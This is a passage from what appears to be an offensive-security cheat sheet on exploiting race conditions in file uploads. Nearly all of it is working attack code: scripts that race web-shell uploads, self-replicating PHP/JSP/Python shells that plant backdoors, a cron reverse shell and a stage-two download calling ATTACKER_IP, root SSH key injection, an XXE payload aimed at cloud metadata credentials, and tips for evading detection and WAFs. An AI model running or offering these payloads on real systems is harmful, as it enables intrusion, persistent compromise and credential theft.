      headers += f"Cookie: {COOKIE}\r\n"
      headers += f"Content-Type: multipart/form-data; boundary=----SlowBoundary\r\n"
      headers += f"Content-Length: {len(body)}\r\n"
      headers += f"\r\n"
      
      # Send headers immediately
      sock.send(headers.encode())
      
      # Send body byte-by-byte with delay
      for byte in body.encode():
          sock.send(bytes([byte]))
          time.sleep(0.01)  # 10ms per byte = wide race window
      
      response = sock.recv(4096)
      sock.close()
      return response
  
  def access_shell():
      """Rapidly try to access the shell"""
      s = requests.Session()
      s.verify = False
      s.headers['Cookie'] = COOKIE
      
      for i in range(1000):
          try:
              r = s.get(f"https://{TARGET}/uploads/race_shell.php",
                       params={'cmd': 'id'}, timeout=1)
              if 'RACE_WON' in r.text:
                  print(f"[+] RACE WON at attempt {i}!")
                  print(r.text[:500])
                  return True
          except:
              pass
      return False
  
  # Run slow upload and fast access concurrently
  upload_thread = threading.Thread(target=slow_upload)
  access_thread = threading.Thread(target=access_shell)
  
  upload_thread.start()
  time.sleep(0.5)  # Let upload start first
  access_thread.start()
  
  upload_thread.join()
  access_thread.join()
  ```
  :::

  :::tabs-item{label="Resource Exhaustion Window"}
  ```bash
  # Exhaust server resources to slow down validation
  # This widens the race window significantly
  
  # Method 1: Concurrent large file uploads to saturate I/O
  for i in $(seq 1 20); do
    dd if=/dev/urandom bs=1M count=50 2>/dev/null | \
      curl -s -X POST https://target.com/upload \
        -F "file=@-;filename=large_${i}.bin" \
        -H "Cookie: session=SESS" -o /dev/null &
  done
  
  # While server is busy, race the actual exploit
  sleep 1
  
  for i in $(seq 1 100); do
    curl -s -X POST https://target.com/upload \
      -F "file=@race_shell.php;filename=race_shell.php" \
      -H "Cookie: session=SESS" -o /dev/null &
    
    result=$(curl -s "https://target.com/uploads/race_shell.php?cmd=id" 2>/dev/null)
    echo "$result" | grep -q "RACE_WON" && echo "[+] WON!" && break
  done
  
  # Method 2: CPU-intensive file that triggers heavy validation
  # If server runs ImageMagick, use specially crafted images
  convert -size 10000x10000 xc:red huge_image.jpg
  
  # Upload huge images to keep ImageMagick busy
  for i in $(seq 1 10); do
    curl -s -X POST https://target.com/upload \
      -F "file=@huge_image.jpg;filename=big_${i}.jpg" \
      -H "Cookie: session=SESS" -o /dev/null &
  done
  ```
  :::

  :::tabs-item{label="Chunked Transfer Slow Body"}
  ```bash
  # Use chunked transfer encoding with slow chunks
  # The server may write partial data before completing validation
  
  python3 << 'PYEOF'
  import socket, ssl, time
  
  target = "target.com"
  cookie = "session=YOUR_SESSION"
  shell = '<?php echo "RACE_WON"; system($_GET["cmd"]); ?>'
  
  ctx = ssl.create_default_context()
  ctx.check_hostname = False
  ctx.verify_mode = ssl.CERT_NONE
  
  s = socket.socket()
  s = ctx.wrap_socket(s, server_hostname=target)
  s.connect((target, 443))
  
  boundary = "----Chunk"
  body_start = f"------Chunk\r\nContent-Disposition: form-data; name=\"file\"; filename=\"race_shell.php\"\r\nContent-Type: image/jpeg\r\n\r\n"
  body_end = f"\r\n------Chunk--\r\n"
  
  headers = f"POST /upload HTTP/1.1\r\n"
  headers += f"Host: {target}\r\n"
  headers += f"Cookie: {cookie}\r\n"
  headers += f"Content-Type: multipart/form-data; boundary=----Chunk\r\n"
  headers += f"Transfer-Encoding: chunked\r\n\r\n"
  
  s.send(headers.encode())
  
  # Send body start as first chunk
  chunk1 = body_start.encode()
  s.send(f"{len(chunk1):x}\r\n".encode() + chunk1 + b"\r\n")
  
  # Slowly send shell content byte by byte
  for byte in shell.encode():
      s.send(f"1\r\n".encode() + bytes([byte]) + b"\r\n")
      time.sleep(0.05)  # 50ms per byte
  
  # Send final chunk
  chunk_end = body_end.encode()
  s.send(f"{len(chunk_end):x}\r\n".encode() + chunk_end + b"\r\n")
  s.send(b"0\r\n\r\n")
  
  print(s.recv(4096).decode())
  s.close()
  PYEOF
  ```
  :::
::

## Framework-Specific Race Conditions

::tabs
  :::tabs-item{label="PHP"}
  ```bash
  # PHP move_uploaded_file race
  # File exists at $_FILES['file']['tmp_name'] (/tmp/phpXXXXXX) 
  # BEFORE move_uploaded_file() is called
  
  # Race the temp file directly
  # PHP temp files: /tmp/php[A-Za-z0-9]{6}
  
  # Brute force temp filename while uploading
  upload_and_race_php() {
    # Upload in background
    curl -s -X POST https://target.com/upload \
      -F "file=@race_shell.php;filename=shell.php" \
      -H "Cookie: session=SESS" &
    
    # Race temp files
    for prefix in php; do
      for suffix in $(cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 6 | head -100); do
        result=$(curl -s "https://target.com/../../tmp/${prefix}${suffix}" 2>/dev/null)
        echo "$result" | grep -q "RACE_WON" && echo "[+] Temp file: /tmp/${prefix}${suffix}" && return
      done
    done
  }
  
  # If upload dir is writable and accessible
  # Race between write and unlink/rename
  for i in $(seq 1 500); do
    curl -s -X POST https://target.com/upload \
      -F "file=@race_shell.php;filename=race_shell.php" \
      -H "Cookie: session=SESS" -o /dev/null &
    
    curl -s "https://target.com/uploads/race_shell.php?cmd=id" | \
      grep -q "RACE_WON" && echo "[+] RACE WON at $i" && break
  done
  ```
  :::

  :::tabs-item{label="Python (Django/Flask)"}
  ```bash
  # Django TemporaryUploadedFile race
  # Default temp dir: /tmp/ with prefix 'tmp'
  # File exists as TemporaryUploadedFile before form.is_valid()
  
  # Flask werkzeug saves to temp before handler processes
  # Default: /tmp/werkzeug-XXXXXXXX
  
  # Race Django upload validation
  for i in $(seq 1 200); do
    # Upload
    curl -s -X POST https://target.com/upload/ \
      -F "file=@race_shell.py;filename=race_shell.py" \
      -H "Cookie: sessionid=SESS" \
      -H "X-CSRFToken: TOKEN" -o /dev/null &
    
    # Access
    for j in $(seq 1 10); do
      curl -s "https://target.com/media/race_shell.py" 2>/dev/null | \
        grep -q "RACE_WON" && echo "[+] RACE WON" && break 2
    done
  done
  
  # Flask with custom upload handler
  curl -s -X POST https://target.com/upload \
    -F "file=@race_shell.py;filename=race_shell.py" \
    -H "Cookie: session=SESS" &
  
  # Race the temp storage
  while true; do
    for f in /tmp/werkzeug-*; do
      [ -f "$f" ] && echo "[+] Found temp: $f" && cat "$f" && break 2
    done
  done
  ```
  :::

  :::tabs-item{label="Node.js (Express/Multer)"}
  ```bash
  # Multer stores to dest/uploads before custom filter runs
  # Race between disk write and filter callback
  
  # Default multer temp: os.tmpdir() or configured dest
  
  for i in $(seq 1 500); do
    # Upload
    curl -s -X POST https://target.com/api/upload \
      -F "file=@race_shell.js;filename=race_shell.js" \
      -H "Cookie: connect.sid=SESS" -o /dev/null &
    
    # Access multiple potential locations
    for path in uploads tmp temp; do
      curl -s "https://target.com/${path}/race_shell.js" 2>/dev/null | \
        grep -q "RACE_WON" && echo "[+] Found at /${path}/race_shell.js" && break 2
    done
  done
  
  # Multer with randomized names - race original name
  # Some configs write with original name then rename
  for i in $(seq 1 500); do
    curl -s -X POST https://target.com/api/upload \
      -F "file=@shell.js;filename=shell.js" \
      -H "Cookie: connect.sid=SESS" -o /dev/null &
    curl -s "https://target.com/uploads/shell.js" | grep -q "RACE" && break
  done
  ```
  :::

  :::tabs-item{label="Java (Spring Boot)"}
  ```bash
  # Spring MultipartFile temp storage
  # Default: server temp directory (e.g., /tmp/tomcat.*/work/)
  # File accessible between transfer and validation
  
  # Spring stores uploaded file before @Valid runs
  for i in $(seq 1 500); do
    curl -s -X POST https://target.com/api/upload \
      -F "file=@shell.jsp;filename=shell.jsp" \
      -H "Cookie: JSESSIONID=SESS" -o /dev/null &
    
    # Race multiple locations
    for path in uploads static resources; do
      curl -s "https://target.com/${path}/shell.jsp" 2>/dev/null | \
        grep -q "RACE_WON" && echo "[+] RACE WON at /${path}/" && break 2
    done
  done
  
  # Tomcat temp directory race
  # Files stored in work directory before servlet processes
  # /tmp/tomcat.XXXXX/work/Tomcat/localhost/ROOT/
  ```
  :::
::

## Persistent Race Exploitation

### Self-Replicating Shell

::callout
When winning the race only grants momentary execution, the shell must immediately create a persistent backdoor before the server deletes the original file.
::

::code-group
```php [PHP Self-Replicator]
<?php
// Execute immediately on access during race window

// 1. Create persistent backdoor in multiple locations
$backdoor = '<?php system($_GET["cmd"]); ?>';
$locations = [
    '/var/www/html/uploads/.cache.php',
    '/var/www/html/.maintenance.php',
    '/var/www/html/assets/.thumb.php',
    '/var/www/html/static/.config.php',
    '/tmp/.web_cache.php',
    '/var/www/html/uploads/.htaccess_backup.php',
];

foreach ($locations as $loc) {
    @file_put_contents($loc, $backdoor);
}

// 2. Add to existing PHP files for stealth
$target_files = glob('/var/www/html/*.php');
foreach (array_slice($target_files, 0, 3) as $f) {
    $content = file_get_contents($f);
    if (strpos($content, 'BACKDOOR_MARKER') === false) {
        $inject = "\n<?php /* BACKDOOR_MARKER */ if(isset(\$_GET['x'])){system(\$_GET['x']);} ?>\n";
        @file_put_contents($f, $content . $inject);
    }
}

// 3. Create cron for reverse shell
@file_put_contents('/etc/cron.d/.cleanup',
    "* * * * * www-data /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n");

// 4. Confirm execution
echo "RACE_WON_" . php_uname() . "_" . shell_exec('id');
?>
```

```python [Python Self-Replicator]
#!/usr/bin/env python3
import os, subprocess

# Immediate persistence
backdoor = '<?php system($_GET["cmd"]); ?>'
targets = [
    '/var/www/html/.cache.php',
    '/var/www/html/uploads/.thumb.php',
    '/tmp/.persist.php',
]

for t in targets:
    try:
        with open(t, 'w') as f:
            f.write(backdoor)
    except:
        pass

# SSH key injection
try:
    os.makedirs('/root/.ssh', exist_ok=True)
    with open('/root/.ssh/authorized_keys', 'a') as f:
        f.write('\nssh-ed25519 AAAAC3...attacker_key attacker@box\n')
except:
    pass

# Output confirmation
print("RACE_WON")
print(subprocess.check_output(['id']).decode())
```

```jsp [JSP Self-Replicator]
<%@ page import="java.io.*" %>
<%
// Write persistent shell
String shell = "<%@ page import=\"java.io.*\" %><% Process p = Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",request.getParameter(\"cmd\")}); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=br.readLine())!=null) out.println(l); %>";

String[] paths = {
    "/opt/tomcat/webapps/ROOT/.cache.jsp",
    "/var/lib/tomcat/webapps/ROOT/.health.jsp",
    "/opt/tomcat/webapps/ROOT/WEB-INF/.monitor.jsp"
};

for (String path : paths) {
    try {
        FileWriter fw = new FileWriter(path);
        fw.write(shell);
        fw.close();
    } catch (Exception e) {}
}

out.println("RACE_WON");
Process p = Runtime.getRuntime().exec("id");
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = br.readLine()) != null) out.println(line);
%>
```
::

### Multi-Stage Race Exploitation

::steps{level="4"}

#### Stage 1 — Win the Race and Drop Persistence

```bash
# Shell that downloads and installs a proper backdoor
cat > stage1.php << 'EOF'
<?php
// Minimal footprint - just download stage2
$stage2 = file_get_contents("http://ATTACKER_IP/stage2.php");
file_put_contents("/var/www/html/uploads/.cache.php", $stage2);
echo "STAGE1_COMPLETE";
?>
EOF

# Race the upload
for i in $(seq 1 1000); do
  curl -s -X POST https://target.com/upload \
    -F "file=@stage1.php;filename=stage1.php" \
    -H "Cookie: session=SESS" -o /dev/null &
  
  result=$(curl -s "https://target.com/uploads/stage1.php")
  if echo "$result" | grep -q "STAGE1_COMPLETE"; then
    echo "[+] Stage 1 complete!"
    break
  fi
done
```

#### Stage 2 — Verify Persistent Access

```bash
# Check if stage2 backdoor was successfully dropped
curl -s "https://target.com/uploads/.cache.php?cmd=id"
curl -s "https://target.com/uploads/.cache.php?cmd=whoami"
curl -s "https://target.com/uploads/.cache.php?cmd=uname+-a"
```

#### Stage 3 — Upgrade to Reverse Shell

```bash
# Listener
nc -lvnp 4444

# Trigger reverse shell via persistent backdoor
curl -s "https://target.com/uploads/.cache.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

::

## Advanced Race Patterns

### Double Request Race (Validation Bypass)

::collapsible
**Bypass: Upload a valid file, race to replace it with a shell before the response is returned**

```python
#!/usr/bin/env python3
"""
Double request race:
1. Upload valid image -> passes validation
2. Simultaneously upload shell with same name -> overwrites before response
"""

import requests
import threading
import time

TARGET = "https://target.com"
UPLOAD_EP = "/upload"
COOKIE = "session=YOUR_SESSION"

# Valid image that passes checks
valid_image = open("legitimate.jpg", "rb").read()

# Malicious shell
shell = b'<?php echo "RACE_WON"; system($_GET["cmd"]); ?>'

barrier = threading.Barrier(2)

def upload_valid():
    """Upload legitimate file to pass validation"""
    s = requests.Session()
    s.headers['Cookie'] = COOKIE
    s.verify = False
    
    for _ in range(100):
        barrier.wait()
        s.post(f"{TARGET}{UPLOAD_EP}",
              files={'file': ('target_file.php', valid_image, 'image/jpeg')})

def upload_shell():
    """Race to overwrite with shell"""
    s = requests.Session()
    s.headers['Cookie'] = COOKIE
    s.verify = False
    
    for _ in range(100):
        barrier.wait()
        time.sleep(0.001)  # Tiny delay so valid uploads first
        s.post(f"{TARGET}{UPLOAD_EP}",
              files={'file': ('target_file.php', shell, 'image/jpeg')})

t1 = threading.Thread(target=upload_valid)
t2 = threading.Thread(target=upload_shell)
t1.start()
t2.start()
t1.join()
t2.join()

# Check if shell persists
r = requests.get(f"{TARGET}/uploads/target_file.php", params={'cmd': 'id'}, verify=False)
if 'RACE_WON' in r.text:
    print(f"[+] Shell deployed: {TARGET}/uploads/target_file.php")
```
::

### Symlink Race Condition

::collapsible
**Create a symlink during the race window to redirect file writes to arbitrary locations**

```python
#!/usr/bin/env python3
"""
Symlink race:
1. Create symlink at upload path pointing to target
2. Upload writes through symlink to arbitrary location
3. Remove symlink before detection
"""

import os
import threading
import time
import requests

# This requires local access or another upload vulnerability
# to create the symlink in the upload directory

TARGET_UPLOAD_DIR = "/var/www/html/uploads"
SYMLINK_NAME = "race_file.php"
REAL_TARGET = "/var/www/html/shell.php"

def create_symlink_loop():
    """Continuously create and recreate symlink"""
    while True:
        try:
            link_path = os.path.join(TARGET_UPLOAD_DIR, SYMLINK_NAME)
            if os.path.exists(link_path):
                os.unlink(link_path)
            os.symlink(REAL_TARGET, link_path)
        except:
            pass
        time.sleep(0.001)

def upload_loop():
    """Continuously upload through the symlink"""
    s = requests.Session()
    s.verify = False
    shell = b'<?php echo "RACE_WON"; system($_GET["cmd"]); ?>'
    
    while True:
        try:
            s.post("https://target.com/upload",
                  files={'file': (SYMLINK_NAME, shell, 'image/jpeg')},
                  headers={'Cookie': 'session=SESS'})
        except:
            pass

# Run both
t1 = threading.Thread(target=create_symlink_loop)
t2 = threading.Thread(target=upload_loop)
t1.daemon = t2.daemon = True
t1.start()
t2.start()

time.sleep(60)  # Run for 60 seconds
```
::

### Database Lock Race

::collapsible
**Exploit database locking to create a window where file validation state is inconsistent**

```python
#!/usr/bin/env python3
"""
Database lock race:
Some apps store upload metadata in DB, then validate.
Race between DB insert (status=pending) and validation update (status=approved/rejected).
If file is served when status=pending, shell executes.
"""

import requests
import threading

TARGET = "https://target.com"
COOKIE = "session=YOUR_SESSION"
SHELL = b'<?php echo "RACE_WON"; system($_GET["cmd"]); ?>'

def mass_upload():
    """Flood uploads to create DB lock contention"""
    s = requests.Session()
    s.headers['Cookie'] = COOKIE
    s.verify = False
    
    for i in range(500):
        # Upload many files to create DB contention
        s.post(f"{TARGET}/upload",
              files={'file': (f'file_{i}.php', SHELL, 'image/jpeg')})

def access_pending():
    """Try to access files in pending state"""
    s = requests.Session()
    s.headers['Cookie'] = COOKIE
    s.verify = False
    
    for i in range(500):
        for j in range(10):
            r = s.get(f"{TARGET}/uploads/file_{i}.php", params={'cmd': 'id'})
            if 'RACE_WON' in r.text:
                print(f"[+] Race won with file_{i}.php!")
                print(r.text[:500])
                return

threads = []
for _ in range(5):
    threads.append(threading.Thread(target=mass_upload))
for _ in range(20):
    threads.append(threading.Thread(target=access_pending))

for t in threads:
    t.start()
for t in threads:
    t.join()
```
::

## Tool Integration

::tabs
  :::tabs-item{label="Turbo Intruder Templates"}
  ```python
  # === Template 1: Basic Upload Race ===
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=1,
                             engine=Engine.BURP2)
  
      for i in range(200):
          engine.queue(target.req, gate='race')
          engine.queue(accessReq, gate='race')
      engine.openGate('race')
  
  # === Template 2: Multi-Endpoint Race ===
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=1,
                             engine=Engine.BURP2)
  
      upload = '''POST /upload HTTP/2\r\nHost: {host}\r\n...'''
      access_paths = [
          '/uploads/race.php', '/tmp/race.php',
          '/media/race.php', '/files/race.php'
      ]
  
      for i in range(100):
          engine.queue(upload, gate='race')
          for path in access_paths:
              req = f'GET {path}?cmd=id HTTP/2\r\nHost: {host}\r\n\r\n'
              engine.queue(req, gate='race')
      engine.openGate('race')
  
  # === Template 3: Widened Window Race ===
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=1,
                             engine=Engine.BURP2)
  
      # First, flood with large uploads to slow server
      for i in range(10):
          engine.queue(largeUploadReq, gate='flood')
      engine.openGate('flood')
  
      import time
      time.sleep(0.5)
  
      # Then race the actual exploit
      for i in range(100):
          engine.queue(shellUploadReq, gate='race')
          for j in range(5):
              engine.queue(accessReq, gate='race')
      engine.openGate('race')
  ```
  :::

  :::tabs-item{label="Nuclei Race Template"}
  ```yaml
  id: race-condition-upload
  
  info:
    name: Race Condition File Upload
    author: pentester
    severity: critical
    tags: race,upload,rce
  
  http:
    - raw:
        - |
          POST /upload HTTP/1.1
          Host: {{Hostname}}
          Cookie: session={{session}}
          Content-Type: multipart/form-data; boundary=----RaceBound
  
          ------RaceBound
          Content-Disposition: form-data; name="file"; filename="race_shell.php"
          Content-Type: image/jpeg
  
          <?php echo "RACE_CONFIRMED_{{rand_text_alphanumeric(8)}}"; ?>
          ------RaceBound--
  
        - |
          GET /uploads/race_shell.php HTTP/1.1
          Host: {{Hostname}}
          Cookie: session={{session}}
  
      race: true
      race_count: 100
      
      matchers:
        - type: word
          words:
            - "RACE_CONFIRMED"
          part: body
  ```
  :::

  :::tabs-item{label="Custom Go Tool"}
  ```go
  // race_upload.go - High-performance race condition exploit
  // go build -o race_upload race_upload.go
  // ./race_upload https://target.com /upload /uploads session=abc
  
  package main
  
  import (
      "bytes"
      "crypto/tls"
      "fmt"
      "io"
      "mime/multipart"
      "net/http"
      "os"
      "strings"
      "sync"
      "sync/atomic"
      "time"
  )
  
  var won int32 = 0
  
  func upload(client *http.Client, target, uploadPath, cookie string, wg *sync.WaitGroup) {
      defer wg.Done()
      shell := `<?php echo "RACE_WON_".php_uname(); system($_GET["cmd"]); ?>`
      
      for i := 0; i < 200 && atomic.LoadInt32(&won) == 0; i++ {
          body := &bytes.Buffer{}
          writer := multipart.NewWriter(body)
          part, _ := writer.CreateFormFile("file", "race_shell.php")
          io.Copy(part, strings.NewReader(shell))
          writer.Close()
          
          req, _ := http.NewRequest("POST", target+uploadPath, body)
          req.Header.Set("Content-Type", writer.FormDataContentType())
          req.Header.Set("Cookie", cookie)
          client.Do(req)
      }
  }
  
  func access(client *http.Client, target, accessPath, cookie string, wg *sync.WaitGroup) {
      defer wg.Done()
      url := target + accessPath + "/race_shell.php?cmd=id"
      
      for i := 0; i < 1000 && atomic.LoadInt32(&won) == 0; i++ {
          req, _ := http.NewRequest("GET", url, nil)
          req.Header.Set("Cookie", cookie)
          resp, err := client.Do(req)
          if err != nil { continue }
          
          buf := make([]byte, 4096)
          n, _ := resp.Body.Read(buf)
          resp.Body.Close()
          
          if strings.Contains(string(buf[:n]), "RACE_WON") {
              atomic.StoreInt32(&won, 1)
              fmt.Printf("[+] RACE WON!\n%s\n", string(buf[:n]))
              return
          }
      }
  }
  
  func main() {
      target := os.Args[1]
      uploadPath := os.Args[2]
      accessPath := os.Args[3]
      cookie := os.Args[4]
      
      tr := &http.Transport{
          TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
          MaxIdleConns: 200,
          MaxIdleConnsPerHost: 200,
      }
      client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
      
      var wg sync.WaitGroup
      
      for i := 0; i < 20; i++ {
          wg.Add(1)
          go upload(client, target, uploadPath, cookie, &wg)
      }
      for i := 0; i < 100; i++ {
          wg.Add(1)
          go access(client, target, accessPath, cookie, &wg)
      }
      
      wg.Wait()
      if atomic.LoadInt32(&won) == 0 {
          fmt.Println("[-] Race condition exploit failed")
      }
  }
  ```
  :::
::

## Chaining Techniques

### Chain 1 — Race Condition + Path Traversal

::steps{level="4"}

#### Upload Shell with Traversal Filename via Race

```bash
# Combine traversal with race - some servers validate traversal
# sequences AFTER writing the file but BEFORE serving it
cat > chain_shell.php << 'EOF'
<?php echo "CHAIN_WON"; system($_GET["cmd"]); 
@file_put_contents("/var/www/html/.hidden.php",'<?php system($_GET["c"]); ?>');
?>
EOF

# Race with traversal payload
for i in $(seq 1 500); do
  curl -s -X POST https://target.com/upload \
    -F "file=@chain_shell.php;filename=../../../var/www/html/chain.php" \
    -H "Cookie: session=SESS" -o /dev/null &
  
  curl -s "https://target.com/chain.php?cmd=id" | \
    grep -q "CHAIN_WON" && echo "[+] CHAIN WON!" && break
done
```

#### Access Persistent Backdoor

```bash
curl "https://target.com/.hidden.php?c=id"
curl "https://target.com/.hidden.php?c=cat+/etc/passwd"
```

::

### Chain 2 — Race Condition + SSRF via Uploaded File

::steps{level="4"}

#### Upload SVG/XML with SSRF Payload

```bash
cat > ssrf_svg.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
EOF
```

#### Race to Access Before Server Reprocesses

```bash
for i in $(seq 1 500); do
  curl -s -X POST https://target.com/upload \
    -F "file=@ssrf_svg.svg;filename=image.svg" \
    -H "Cookie: session=SESS" -o /dev/null &
  
  result=$(curl -s "https://target.com/uploads/image.svg")
  echo "$result" | grep -qiE "iam|role|credential" && echo "[+] SSRF data leaked!" && echo "$result" && break
done
```

::

### Chain 3 — Race Condition + Deserialization

::steps{level="4"}

#### Upload Serialized Payload

```bash
# PHP deserialization payload
php -r '
class Evil {
    public $cmd = "id > /var/www/html/uploads/rce_proof.txt";
    function __destruct() { system($this->cmd); }
}
echo serialize(new Evil());
' > payload.ser

# Race upload and access before validation
for i in $(seq 1 500); do
  curl -s -X POST https://target.com/upload \
    -F "file=@payload.ser;filename=data.ser" \
    -H "Cookie: session=SESS" -o /dev/null &
  
  curl -s "https://target.com/uploads/data.ser" -o /dev/null &
done

# Check for proof of execution
curl -s "https://target.com/uploads/rce_proof.txt"
```

::

### Chain 4 — Race Condition + .htaccess Manipulation

::steps{level="4"}

#### Race Upload of .htaccess

```bash
cat > evil_htaccess << 'EOF'
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg
EOF

# Race to write .htaccess before server removes it
for i in $(seq 1 500); do
  curl -s -X POST https://target.com/upload \
    -F "file=@evil_htaccess;filename=.htaccess" \
    -H "Cookie: session=SESS" -o /dev/null &
done
```

#### Upload PHP Shell Disguised as JPG

```bash
echo '<?php echo "HTACCESS_RACE_WON"; system($_GET["cmd"]); ?>' > shell.jpg

curl -s -X POST https://target.com/upload \
  -F "file=@shell.jpg;filename=shell.jpg" \
  -H "Cookie: session=SESS"

curl "https://target.com/uploads/shell.jpg?cmd=id"
```

::

## Verification & Evidence Collection

::code-group
```bash [Confirm Race Window Exists]
# Timing-based confirmation
for i in $(seq 1 100); do
  # Record upload timestamp
  upload_start=$(date +%s%N)
  
  curl -s -X POST https://target.com/upload \
    -F "file=@test_race.txt;filename=test_race.txt" \
    -H "Cookie: session=SESS" -o /dev/null &
  UPLOAD_PID=$!
  
  # Immediately try to access
  for j in $(seq 1 50); do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/uploads/test_race.txt" 2>/dev/null)
    access_time=$(date +%s%N)
    elapsed=$(( (access_time - upload_start) / 1000000 ))
    
    if [ "$code" = "200" ]; then
      echo "[+] File accessible at ${elapsed}ms (round $i, attempt $j)"
      
      # Check if file still exists after short delay
      sleep 1
      post_code=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://target.com/uploads/test_race.txt")
      if [ "$post_code" = "404" ]; then
        echo "[!] File DELETED after 1s - RACE WINDOW CONFIRMED"
        echo "[*] Window: ~${elapsed}ms"
      fi
      break
    fi
  done
  
  wait $UPLOAD_PID
done
```

```bash [Minimal PoC for Reports]
# Non-destructive proof of concept
echo "RACE_CONDITION_VERIFIED_BY_RESEARCHER_$(date +%s)" > poc_race.txt

# Record full evidence
{
  echo "=== Race Condition Upload PoC ==="
  echo "Target: https://target.com/upload"
  echo "Date: $(date)"
  echo ""
  echo "=== Upload Request ==="
  
  curl -v -X POST https://target.com/upload \
    -F "file=@poc_race.txt;filename=poc_race.txt" \
    -H "Cookie: session=SESS" 2>&1 &
  
  echo ""
  echo "=== Concurrent Access (file accessible during validation window) ==="
  
  for i in $(seq 1 100); do
    result=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
      "https://target.com/uploads/poc_race.txt" 2>/dev/null)
    code=$(echo "$result" | grep "HTTP_CODE:" | cut -d: -f2)
    
    if [ "$code" = "200" ]; then
      echo "[+] Attempt $i: HTTP 200 - File accessible"
      echo "Content: $(echo "$result" | grep -v HTTP_CODE)"
      
      sleep 2
      post_code=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://target.com/uploads/poc_race.txt")
      echo "[*] After 2s: HTTP ${post_code} (404 = file was deleted = race confirmed)"
      break
    fi
  done
} | tee race_condition_poc_evidence.txt
```

```bash [Screenshot-Ready Evidence]
# For report screenshots - clean single command
echo '<?php echo "RACE_CONDITION_POC - " . date("Y-m-d H:i:s") . " - " . php_uname(); ?>' > poc.php

# Terminal 1 (screenshot this)
watch -n 0.1 'curl -s https://target.com/uploads/poc.php 2>/dev/null || echo "Not accessible"'

# Terminal 2 (screenshot this)  
while true; do
  curl -s -X POST https://target.com/upload \
    -F "file=@poc.php;filename=poc.php" \
    -H "Cookie: session=SESS" -o /dev/null
done
```
::

## Detection Evasion

::accordion
  :::accordion-item{label="Randomize Filenames Per Attempt"}
  ```bash
  # Avoid detection by not hammering the same filename
  for i in $(seq 1 500); do
    RAND=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -1)
    FILENAME="img_${RAND}.php"
    
    curl -s -X POST https://target.com/upload \
      -F "file=@shell.php;filename=${FILENAME}" \
      -H "Cookie: session=SESS" -o /dev/null &
    
    curl -s "https://target.com/uploads/${FILENAME}?cmd=id" | \
      grep -q "RACE_WON" && echo "[+] Won with ${FILENAME}" && break
  done
  ```
  :::

  :::accordion-item{label="Vary Request Timing"}
  ```bash
  # Add random jitter to avoid pattern-based detection
  for i in $(seq 1 500); do
    JITTER=$(( RANDOM % 100 ))
    
    curl -s -X POST https://target.com/upload \
      -F "file=@shell.php;filename=race_shell.php" \
      -H "Cookie: session=SESS" -o /dev/null &
    
    # Random microsecond delay
    usleep $((JITTER * 1000)) 2>/dev/null || sleep 0.0${JITTER}
    
    curl -s "https://target.com/uploads/race_shell.php?cmd=id" | \
      grep -q "RACE_WON" && break
  done
  ```
  :::

  :::accordion-item{label="Rotate User-Agents and Headers"}
  ```bash
  # Rotate headers to avoid WAF rate limiting
  AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15"
  )
  
  for i in $(seq 1 500); do
    UA="${AGENTS[$((RANDOM % ${#AGENTS[@]}))]}"
    
    curl -s -X POST https://target.com/upload \
      -F "file=@shell.php;filename=race_shell.php" \
      -H "Cookie: session=SESS" \
      -H "User-Agent: ${UA}" \
      -H "X-Forwarded-For: $((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))" \
      -o /dev/null &
    
    curl -s "https://target.com/uploads/race_shell.php?cmd=id" \
      -H "User-Agent: ${UA}" | grep -q "RACE_WON" && break
  done
  ```
  :::

  :::accordion-item{label="Use Legitimate Upload Alongside"}
  ```bash
  # Mix legitimate and malicious uploads to blend in
  for i in $(seq 1 200); do
    # Legitimate upload (noise)
    curl -s -X POST https://target.com/upload \
      -F "file=@real_photo.jpg;filename=photo_${i}.jpg" \
      -H "Cookie: session=SESS" -o /dev/null &
    
    # Malicious upload (hidden in traffic)
    curl -s -X POST https://target.com/upload \
      -F "file=@shell.php;filename=race_shell.php" \
      -H "Cookie: session=SESS" -o /dev/null &
    
    # Race access
    curl -s "https://target.com/uploads/race_shell.php?cmd=id" | \
      grep -q "RACE_WON" && break
  done
  ```
  :::
::

## Quick Reference

::field-group
  ::field{name="Attack Type" type="string"}
  TOCTOU (Time-of-Check to Time-of-Use) race condition on file upload validation
  ::

  ::field{name="Best Tool" type="string"}
  Burp Suite Turbo Intruder with HTTP/2 single-packet attack (`Engine.BURP2`)
  ::

  ::field{name="Minimum Concurrency" type="string"}
  10 upload threads + 50 access threads for reliable exploitation
  ::

  ::field{name="Window Widening" type="string"}
  Upload 10-50MB padded files, slow chunked transfer, concurrent large uploads for I/O saturation
  ::

  ::field{name="Persistence Strategy" type="string"}
  Self-replicating shell that writes backdoors to multiple locations on first execution
  ::

  ::field{name="Key Shell Feature" type="string"}
